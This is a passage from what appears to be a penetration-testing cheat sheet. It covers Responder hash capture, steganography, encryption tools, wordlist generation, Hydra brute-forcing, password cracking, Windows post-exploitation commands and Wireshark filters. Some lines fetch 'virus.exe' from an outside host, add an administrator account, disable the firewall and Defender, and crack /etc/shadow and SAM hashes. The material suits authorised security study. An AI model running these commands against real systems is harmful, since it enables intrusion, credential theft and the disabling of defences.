Used to capture NTLMv2 hashes via LLMNR poisoning

#### Capturing a hash

Used for LLMNR/NBT-NS poisoning 

```bash
cd /usr/share/responder
sudo python Responder.py -I eth0 -rdwv
```

eth0 is the interface you want to listen on

#### Cracking a hash

Hashes are stored in `/usr/share/responder/logs` and the file format is `PROTOCOL-NTLMv2-SSP-IP.txt`

```bash
cd /usr/share/responder/logs
john SMB-NLTMv2-SSP-10.10.10.3.txt
```

# Steganography

Hiding data within an image/audio/video/any file

## Snow

Used to hide/reveal text in whitespaces of a file

### To hide text 

#### Without a password

```txt
snow.exe -C -m "12345" test1.txt test2.txt
```

Here, we have a file named 'test1.txt' and it includes 'Hello World 123'. Now snow will create a new file named 'test2.txt' which includes the contents of 'test1.txt' and the secret message "123456" is hidden in 'test2.txt' in the form of whitespaces 

#### With a password

```txt
snow.exe -C -p "test123" -m "12345" test1.txt test2.txt
```

Here, we have a file named 'test1.txt' and it includes 'Hello World 123'. Now snow will create a new file named 'test2.txt' which includes the contents of 'test1.txt' and the secret message "123456" is hidden in 'test2.txt' in the form of whitespaces. To read the text in whitespaces, we will have to remember the password i.e. 'test123'

### To reveal text 

#### Without a password

```txt
snow.exe -C test2.txt
```

Here, 'test2.txt' is the file containing text which is hidden in whitespaces

#### With a password

```txt
snow.exe -C -p "test123" test2.txt
```

Here, 'test2.txt' is the file containing text which is hidden in whitespaces and "test123" is the password to reveal the text

## Quick Stego

Used to hide/reveal text in an image

TEXT HIDDEN IN AN IMAGE WITH QUICK STEGO CAN ONLY BE REVEALED BY USING QUICK STEGO

### To hide text in an image

* Create a text file and add some content to it such as 'my pass is test123'
* In Quick Stego, click on 'Open Image' at the bottom left and select the image in which you want to embed the secret message
* Now click 'Open Text' on the right and select the text file containing your secret
* The content of the text file will be loaded
* Finally, click on 'Hide Text' and then click on 'Save Image' and save the new image which contains the secret text

### To reveal text in an image

* Open Quick Stego and click on 'Open Image'
* Select the image containing the secret text
* The text embedded in the image will be display on the right

## Open Stego

Similar to Quick Stego but a password can be set to reveal the text in the image

TEXT HIDDEN IN AN IMAGE WITH OPEN STEGO CAN ONLY BE REVEALED BY USING OPEN STEGO

### To hide text in an image

* Create text file and add some content to it such as 'my pass is test123'
* In the 'Message File' field of Open Stego, specify the location of the text file
* In the 'Cover File' field specify the location of the image file
* In the 'Output Stego File' field specify the location where the new image file containing the secret text should be stored
* You may set a password which can be specified when revealing the secret text
* Once you have specified the options, click on 'Hide Data' in the bottom right

### To reveal text in an image

* On the left, click on 'Extract Data'
* In the 'Input Stego File' field specify the location of the image file containing the secret text
* In the 'Output Folder for Message File' specify the folder where the secret text should be stored
* If a password has been set to reveal the text, specify it in the 'Password' field
* Once you have specified the options, click on 'Extract Data'
* Now a text file will be created in the specified folder containing the secret text

## StegHide

Command line utility for hiding/revealing text in image/audio files

### To hide text in an image

* Create a text file and add some content to it such as 'my pass is test123'
* Now we can embed the contents of the text file in an image by running this command

```bash
steghide embed -ef './steg/secret.txt' -cf './steg/img.jpg'
```

Here, './steg/secret.txt' is the file containing the secret text and './steg/img.jpg' is the image in which we wish to embed the content of './steg/secret.txt'

* Now we will have to specify a password which can be used to reveal the secret text
* StegHide will then embed the text into the image

### To reveal text in an image

* To reveal the text, run this command

```bash
steghide extract -sf './steg/img.jpg' -xf message.txt
```

Here, './steg/img.jpg' is the image file in which the secret text is embedded and 'message.txt' is the file in which steghide will store the secret text

* Now we have to specify the password we set when we were embedding the text
* StegHide will now write the secret text to 'message.txt'

## Strings

Finds human-readable characters within a file

```bash
strings image.png
```

## Exiftool

Used to extract metadata from a file 

```bash
exiftool image.png
```

## Binwalk 

Used to extract files and data which are embedded within an image/video file

```bash
binwalk -e --dd=".*" image.png
```

## Foremost 

Similar to Binwalk but this tool works with only png files

```bash
foremost -i image.pmg
```

# Cryptography

Converting plain text to unreadable characters by using an algorithm and a key. Algorithm is the way the text is encrypted and the key is used to decrypt the text

## HashCalc

Used to check the integrity of a file/string by calculating the message digests, checksums and HMACs of a file/string. It converts the content of the file/string to a hash

* Launch HashCalc
* In the 'Data Format' dropdown select whether the text to check should be loading from a file or pasted as a string
*  If you select 'Text string', paste the text in the 'Data' field and click on 'Calculate' at the bottom
*  If you select 'File', paste the location of the file and click on 'Calculate' at the bottom
*  By default, HashCalc will display the MD5,SHA1,CRC32 and RIPEMD160 hashes. You can select more

## MD5 Calculator

As the name suggests, this will load the contents of a file and display it's MD5 Digest. It can also compare an MD5 Digest with another

* Open the folder where the file exists and right click on it
* Select 'MD5 Calcualtor'
* This will display the MD5 Digest of the contents of the file in the 'MD5 Digest' field
* We can compare this MD5 Digest with another by pasting the latter MD5 Digest in the 'Compare To' field

## CryptoForge

Used for encryption/decryption of text by using a password

### Without the text editor

#### Encrypting 

* Open the folder where the file exists and right click on it
* Select 'Encrypt'
* Type the password which can be used when decrypting the file
* Click on 'OK'
* This will replace the original file with a new file having the 'cfe' file extension

#### Decrypting

* Open the folder where the encrypted file exists and double click it
* Type the password which you entered when encrypting it
* Now the encrypted file should be replaced by the decrypted file

### With the text editor

#### Encrypting 

* Open the 'CryptoForge Text' application 
* Type the text you wish to encrypt 
* Now click on 'Encrypt' and type the password to be used when decrypting it
* Click on 'Ok'
* In the top left, click on 'File' and then on 'Save'
* Browse to the folder where you want to store the file
* Type a name for the file and press enter. This will create a CryptoForge Document. Its file extension is 'cfd'. 

#### Decrypting

* Open the folder where the CryptoForge Document exists
* Double click the document
* Click on 'Decrypt' and type the password you typed when encrypting it
* Click on 'Ok'
* This will decrypt the encrypted text and display it

## BCTextEncoder

Used to encode/decode text using the AES-256 algorithm

### Encoding

* Open the BCTextEncoder app
* In the large text field, type the text you wish to encode
* Now at the top right, click on 'Encode' and type the password to be used to decode it 
* The encoded text will be displayed at the bottom of the window

### Decoding

* At the bottom of the window, the encoded text is displayed
* Click on 'Decode' which is at the bottom right
* Type the password you used while encoding the text and click on 'Ok'
* Now the decoded text will be displayed 

## Cryptool

Lets us encrypt/decrypt data by using hexadecimal keys and analyse algorithms

### Encrypting

* Open Cryptool and close the the 'How to start' and 'startingexample-en.txt' windows
* Click on 'File' in the top left corner and select 'New'
* In the new window, type the data you want to encrypt
* In the top bar, click on 'Encrypt/Decrypt' and then click on 'Symmetric(modern)' and select the encryption algorithm
* Now type in a hexadecimal key which can be used to decrypt the data
* A new window will pop up. This will contain the encrypted data
* To save this, click on 'File' and then on 'Save' and provide a name for the file 
* This will generate a new file with the extension of '.hex'

### Decrypting 

* Click on 'File' in the top left corner and select 'Open'
* Select the file containing the encrypted data. It's extension should be '.hex'
* In the top bar, click on 'Encrypt/Decrypt' and then click on 'Symmetric(modern)' and select the encryption algorithm you used during encryption
* Type the hexadecimal key you set when encrypting the data
* Now the decrypted data should be displayed in a new window

## VeraCrypt

Used to create virtual encrypted volumes which can then be mounted to access the files/folders

### Creating a virtual encrypted volume

* Open VeraCrypt and click on 'Create Volume'
* Click on 'Next' as by default, the virtual encrypted volume option is selected
* Click on 'Next' again as by default, the standard volume type is selected
* Enter the location where the volume should be saved and click on 'Next' 
* Again, click on 'Next' as by default, the encryption algorithm is AES and hashing algorithm is SHA-512, which are the best
* Enter the size to allocate to the volume. The size maybe in KB/MB/GB/TB. Click on 'Next' after you have specified the size
* Set a password which can be used when mounting your volume to a drive. Once you have done so, click on 'Next'
* Select a file system from the dropdown
* Now start randomly moving your mouse so that the encryption process takes place easily and quickly 
* Click on 'Format' when the bar turns green 
* Now, the virtual encrypted volume should be created

### Mounting the volume to a drive

* Open VeraCrypt and click on 'Select File'
* Select your virtual encrypted volume
* Now in the big white field where drive letters are mentioned, select the drive letter you wish to mount the volume to  
* Click on 'Mount'
* Enter the password you set when creating the volume and click on 'Ok'
* Now you can open your file explorer and a new drive should be created
* To dismount the volume, click on 'Dismount' and the drive will no longer be available 

# Generating a wordlist

## Crunch 

Used for pure bruteforce attacks

#### Specifying a minimum and maximum password length

```bash
crunch 1 10 -o wordlist.txt
```

#### Specifying characters to use

```bash
crunch 1 5 abcdABCD1234 -o wordlist.txt
```

#### Reading characters from a file

```bash
crunch 1 5 -f chars.txt -o wordlist.txt
```

#### Using a pattern

```bash
crunch 1 3 -t @,%^ -o wordlist.txt
```

@ -> Insert lowercase letters

, -> Insert uppercase letters

% -> Insert numbers

^ -> Insert symbols

## Cewl

Used to scrape data from a website and generate a wordlist

#### Scraping data 

```bash
cewl http://10.10.10.3
```

#### Scraping data and storing it

```bash
cewl http://10.10.10.3 -w wordlist.txt
```

#### Finding emails
 
```bash
cewl http://10.10.10.3 -n -e
```

#### Specify a minimum length for words

```bash
cewl http://10.10.10.3 -m 5
```

#### Increase the depth

Default is 2

```bash
cewl http://10.10.10.3 -d 4
```

#### Adding numbers 

```bash
cewl http://10.10.10.3 --with-numbers
```

#### Counting the number of times a word has appeared

```bash
cewl http://10.10.10.3 -c
```

## Cupp

Used to generate wordlists based on a person's details

#### Installation

```bash
git clone https://github.com/Mebus/cupp/
```

#### Generating wordlist

```bash
cd cupp
python3 cupp.py -i
```

Now an interactive prompt is displayed where you can specify the details

# Hydra

### Specifying  a user list and password list

```bash
hydra -L /opt/users.txt -P /opt/rockyou.txt ssh://10.10.10.3
hydra -L /opt/users.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.3 ssh
```

### Specifying a username and password list

```bash
hydra -l root -P /opt/rockyou.txt ssh://10.10.10.3
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.3 ssh
```

### Specifying a user list and password

```bash
hydra -L /opt/users.txt -p password123 ssh://10.10.10.3
hydra -L /opt/users.txt -p password123 10.10.10.3 ssh
```

### Specifying a port if it is not the default one

```bash
hydra -L /opt/users.txt -p password123 ssh://10.10.10.3:2222
hydra -L /opt/users.txt -p password123 -s 2222 10.10.10.3 ssh
```

### Bruteforcing services

#### FTP

```bash
hydra -L /opt/users.txt -P /opt/rockyou.txt ftp://10.10.10.3
```

#### SSH

```bash
hydra -L /opt/users.txt -P /opt/rockyou.txt ssh://10.10.10.3
```

#### SMB

```bash
hydra -L /opt/users.txt -P /opt/rockyou.txt smb://10.10.10.3
```

#### MySQL

```bash
hydra -L /opt/users.txt -P /opt/rockyou.txt 10.10.10.3 mysql
```

#### RDP

```bash
hydra -L /opt/users.txt -P /opt/rockyou.txt rdp://10.10.10.3
```

#### HTTP POST Form

First we should enter random credentials in the website and capture the request with Burp

We should take a note of the all the post parameters, the path of the file which checks the credentials and the error displayed for wrong credentials

Then the values for the username and password parameters should be replaced with '^USER^' and '^PASS^' respectively

```bash
hydra -L /opt/users.txt -P /opt/rockyou.txt 10.10.10.3 http-post-form "/login.php:user=^USER^&pass=^PASS^&submit=true:Invalid credentials"
```

# Password cracking

## Hash Identifier 

Used to identify the hash algorithm

Launch it by typing

```bash
hash-identifier
```

And then paste the hash and hit enter 

## John the Ripper

#### Basic cracking

```bash
john hash.txt
john hash1.txt hash2.txt
```

#### Providing a wordlist

By default, it uses `/usr/local/john-the-ripper/password.lst`

```bash
john --wordlist=/opt/rockyou.txt hash.txt 
```

#### Showing hash formats

```bash
john --list=formats
```

#### Providing a hash format

```bash
john --format=raw-md5 hash.txt
john --format=raw-sha256 hash.txt
```

#### Cracking Linux passwords

Privileges to read `/etc/shadow` are required

```bash
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=/opt/rockyou.txt hashes.txt 
```

#### Cracking a ZIP file's password

```bash
zip2john file.zip > hash.txt
john --format=zip hash.txt
```

#### Cracking a RAR file's password

```bash
rar2john file.rar > hash.txt
john --format=rar hash.txt
```

#### Cracking an SSH private key's password

```bash
ssh2john id_rsa > hash.txt
john hash.txt
```

## Hashcat

```bash
hashcat -m 0 -a 0 hash.txt /opt/rockyou.txt
```

-m is used to specify the hash type i.e. MD5 

More hash types and examples can be found [here](https://hashcat.net/wiki/doku.php?id=example_hashes)

## PwDump7 and Ophcrack

Used for windows password dumping and cracking

#### Dumping hashes from the SAM file

```bash
pwdump7.exe > hashes.txt
OR
pwdump7.exe localhost > hashes.txt
```

#### Cracking the hashes

* Launch ophcrack
* On the top left, click on 'Load' and select 'PWDUMP file'
* Select the file containing the hashes
* In the middle, click on 'Tables' and choose a table such as Vista free or XP flash
* Once you have chosen a table, click on 'Install' at the bottom
*  Select a folder where the table should be stored and then click on 'Ok'
*  Finally click on 'Crack' at the top and it will start cracking the passwords

## Rainbow Crack

### Generating a rainbow table

To generate a rainbow table, we will use Winrtgen

* Launch Winrtgen and click on 'Add Table' on the bottom left
* Select the type of hash you want to crack in the 'Hash' field
* Select the set of characters you want to use in the 'Charset' field
* Specify the minimum and maximum number of plain text strings in the 'Min Len' and 'Max Len' fields respectively 
* Set the value of 'Index' as 0
* Type the length of the chain length in the 'Chain Len' field. The larger the number is, the more hashes are stored in the table
* Type the number of chains in the 'Chain Count' field
* Set the value of 'N° of tables' as 1
* If you are not sure about the above options, set 'Min Len' as 4, 'Max Len' as 6, 'Chain Count' as 4000000 and 'Chain Len' as 2400. Note: If you are gonna crack hashes dumped by PWDUMP, set the 'Hash' as 'ntlm'
* Once you have set all the options, click on 'Ok' and it will start generating your rainbow table

### Cracking a hash with your rainbow table

* Launch 'rcrack_gui.exe'
* On the top left. click on 'File' and load your hashes from a file or a PWDUMP file
* On the top, click on 'Rainbow Table' and select 'Search Rainbow Tables' and select the rainbow table generated by Winrtgen. It's file extension will be '.rt'
* Once you load your rainbow table, Rainbow Crack will start cracking the hashes

# Useful Windows commands

### Getting system information

```bash
wmic os get Caption, BuildNumber, OSArchitecture, version
systeminfo
```

### Displaying environment variables

```bash
set
```

### Displaying all information about current users

```bash
whoami /all
```

### Displaying users

```bash
net user
```

### Getting basic information about a user

```bash
net user admin2
```

### Creating a user

```bash
net user admin2 pass123 /add
```

### Displaying groups

```bash
net localgroup
```

### Getting information about a group

```bash
net localgroup "Administrators"
```

### Adding a user to a group

```bash
net localgroup Administrators admin2 /add
```

### Getting password policy

```bash
net accounts
```

### Listing processes 

```bash
tasklist /V
powershell -Command "ps"
```

### Downloading a file

```bash
certutil.exe -urlcache -split -f http://10.10.10.5/virus.exe virus.exe
powershell -Command "wget http://10.10.10.5/virus.exe -OutFile virus.exe"
curl http://10.10.10.5/virus.exe -o virus.exe
```

### Disabling firewall

Admin privileges required

```bash
netsh Advfirewall set allprofiles state off
```

### Disabling Windows Defender

Admin privileges required

```powershell
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
```

# Wireshark

Used for traffic sniffing and analysis

## Filters

## Capture filters

Only the specified type of traffic will be captured

To use these filters, first we have to start sniffing traffic and then click on the black cog icon(top left) and type the filter(s) and click on 'Start'

#### Capturing traffic from/to an IP

```txt
host 10.10.10.3
```

#### Capturing traffic on a specified subnet

```txt
net 10.10.10.0/24
```

#### Capturing packets sent to a host

```txt
dst 10.10.10.3
```

#### Capturing packets sent from a host

```txt
src 10.10.10.5
```

#### Capturing traffic sent/received to/by a specified port

```txt
port 80
```

#### Capturing protocol specific traffic

```txt
tcp
udp
http
https
dns
ssh
ftp
smtp
icmp
arp
telnet
```

#### Logical operators

```txt
port 80 and port 443 (Only traffic sent to ports 80 and 443 is captured)

dst 10.10.10.3 and port 80 and port 445 (Destination is 10.10.10.3 and the traffic sent to port 80 and 445)

src 10.10.10.3 or src 10.10.10.1 (The source IP can be 10.10.10.3 or 1)

src 10.10.10.6 and port 80 or port 443 (The source is 10.10.10.6 and the traffic is sent to port 80 or 443)

port 80 and not https (Traffic is sent to port 80 and it is not https)

port 22 and not host 10.10.10.7 (Traffic is sen to port 80 and the IP sending/receiving traffic cannot be 10.10.10.7)
```

## Display Filters

All traffic is captured but we can display only certain traffic using these filters

When starting the capture, we can type the display filters in the bar at the top which says 'Apply a display filter'. Here you can type the filter(s) and hit enter

If the bar is red, then wireshark will not be able to perform the operation

#### Displaying traffic from/to an IP

```txt
ip.addr == 10.10.10.3
```

#### Displaying packets sent to a host

```txt
ip.dst == 10.10.10.3
```

#### Displaying packets sent from a host

```txt
ip.src 10.10.10.5
```

#### Displaying protocol specific traffic

```txt
tcp
udp
http
https
dns
ssh
ftp
smtp
icmp
arp
telnet
```

#### Displaying traffic sent to a specified port

```txt
tcp.dstport == 80
udp.dstport == 161
```

#### Displaying traffic received by a specified port

```txt
tcp.srcport == 80
udp.srcport == 161
```

#### Displaying traffic sent/received by/to a specified port

```txt
tcp.port == 80
udp.port == 161
```

#### Checking if a packet contains a specified text

```txt
http contains "username="
smtp contains "From: "
ftp contains "PASS "
```

#### HTTP

```txt
http (All HTTP Traffic)

http.request (Only requests)

http.request.method == "GET" (All HTTP requests where GET method is used)

http.request.method == "POST" (All HTTP requests where GET method is used. Can be used to find credentials)

http.response (All responses)

http.response.code == 200 (Only responses where the status code is 200)

http.response.code == 403 (Only responses where the status code is 403)
```

#### Logical operators

```txt
ip.src == 10.10.10.3 and http and ssh (Source is 10.10.10.3 and http and ssh traffic is displayed)

tcp.port == 80 and http (Traffic is sent to port 80 and it is http)

ip.src == 10.10.10.7 or ip.src == 10.10.10.3 (Source can be 10.10.10.7 or 3) 

ip.dst == 10.10.10.1 and (http or ssh) (Destination is 10.10.10.1 and the traffic is http or ssh)

ip.dst == 10.10.10.1 and not http (Destination is 10.10.10.1 and the traffic is not http)

tcp.port == 21 and !(ftp or ssh) (Traffic sent to 21 and it is not ftp nor ssh)

ip.src != 10.10.10.2 and tcp.port != 80 (Source is not 10.10.10.2 and traffic is not sent to port 80)
```

## Customizing Wireshark

* Click on 'View' in the top bar and select 'Time Display Format' and click on 'Date and Time of the Day'
* Click on a column value such as 'Source' or 'Info' and select 'Column Preferences'
* Click on the '+' at the bottom left and provide the name  as 'Host' and in the 'Type' field type 'http.host'
* Click on the '+' at the bottom left and provide the name as 'Src Port' and in the 'Type' field for it, select 'Source port'
* Click on the '+' at the bottom left and provide the name  as 'Dst Port' and in the 'Type' field for it, select 'Destination port'
* Drag the 'Src Port' column to below 'Source' and drag the 'Dst Port' column to below 'Destination'. Drag the 'Host' column to below 'Protocol'
* Click on 'Ok'

## Checking all protocols in a capture

Click on 'Statistics' in the top bar and select 'Protocol Hierarchy'

This will display all the protocols used and the percentage of which packets using that protocol

If we want to use a protocol as a filter, right click on it and select 'Apply as filter' and click on 'Selected'

## Finding all IPs in a capture

Click on 'Statistics' in the top bar and select 'Endpoints'

This will display all the IP addresses in the capture and the number of packets sent/received

## OS Detection by TTL and Window Size

These are displayed in the 'Info' section of a packet or can be viewed by pulling up the white window at the bottom

Time to Live is the number of routers a packet can be routed through before it is destroyed

Operating System | Time-to-Live(TTL) | TCP Window Size
--- | --- | ---
Linux(Kernel 2.4 and 2.6) | 64 | 5840
FreeBSD | 64 | 65535
OpenBSD | 64 | 65535
Google customized Linux | 64 | 5720
Windows XP | 128 | 65535
Windows 7, Vista and Server 2008 | 128 | 8192
Cisco Router IOS 12.4 | 255 | 4128

## Detecting a SYN Flood

To detect a SYN Flood aka a DOS/DDOS, we will use this display filter in wireshark. This will display all packets which have a SYN but not an ACK

```txt
tcp.flags.syn == 1 and tcp.flags.ack == 0
```

Also we can check if a bunch of IPs are attacking our IP by checking the destination column

Normally, the window size and the length of each packet will also be the same. These can be found in the 'Info' column of a packet

## Finding a trojan

In this scenario, we will find the files downloaded by a victim and check which one of them is a trojan

* First we will have to search for HTTP requests sent by the user. This can be done by using this display filter

```txt
http.request
```

* Here, we get all the HTTP requests made by the victim. We also get information such as source IP, destination IP, the domain name of the website and the information about the request
* Now we can find all the files in this capture by clicking on 'File' in the top left and selecting 'Export Objects' and then selecting 'HTTP'
* This will display all the files downloaded or loaded over HTTP
* We can sort the list by clicking on 'Content Type'
* Most viruses will have a content type as follows 'application/TYPE'. For example, the content type of an EXE file is 'application/x-msdownload', for a shockwave flash file it is 'application/x-shockwave-flash' and for an MSI file it is 'application/x-msi'
* Once we have discovered the suspicious file(s), we can see the domain it has come from under the 'Hostname' column
* To download the file, select it and click on 'Save' in the bottom. Name it and provide the correct file extension 
* To confirm whether it is a virus or not, go to [VirusTotal](https://virustotal.com) and upload the file
* If you do not wish to directly upload the file, you can calculate its MD5 digest

```bash
md5sum virus.exe (Linux)
certutil -hashfile virus.exe MD5 (Windows)
```

* Once you have the MD5 digest, click [here](https://www.virustotal.com/gui/home/search) and paste the hash and hit enter

## Finding data sent/received by Covert TCP

Covert TCP sends packets with problems. The problem being that TCP port numbers are reused. However this will not affect the sending/receiving of data

Covert TCP sends data, character by character in the IP header

* Covert TCP uses the TCP protocol, so use this display filter

```txt
tcp
```

* Since the packets have problems, search for the packets where the colour is black
* Now click on one of these packets and pull up the big white box from the bottom 
* Click on the 'Internet Protocol Version 4' header and click on 'Identification'
* Now you should be able to see a character in the hexdump at the bottom of the wireshark window. The character should be in the second row and after .(

```txt
........ ..........
.(a...@. <o+_+...
...,"`.. .......P.
...]..
```

* We can view the other data by going down the list of black coloured packets

# Cheatsheets

*  [Nmap](https://github.com/jasonniebauer/Nmap-Cheatsheet)
*  [Dirb](https://www.hackingarticles.in/comprehensive-guide-on-dirb-tool/)
*  [Gobuster](https://3os.org/penetration-testing/cheatsheets/gobuster-cheatsheet/)
*  [WPScan](https://thehacktoday.com/scan-and-hack-wordpress-website-using-wpscan-and-metasploit/)
*  [SQLMap](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet)
*  [DVWA Solutions](https://bughacking.com/dvwa-ultimate-guide-first-steps-and-walkthrough/)
*  [Nessus](https://null-byte.wonderhowto.com/how-to/hack-like-pro-scan-for-vulnerabilities-with-nessus-0169971/)
*  [MSFVenom](https://book.hacktricks.xyz/shells/shells/msfvenom)
*  [Hydra](https://book.hacktricks.xyz/brute-force)
*  [Wireshark](https://www.comparitech.com/net-admin/wireshark-cheat-sheet/)

***
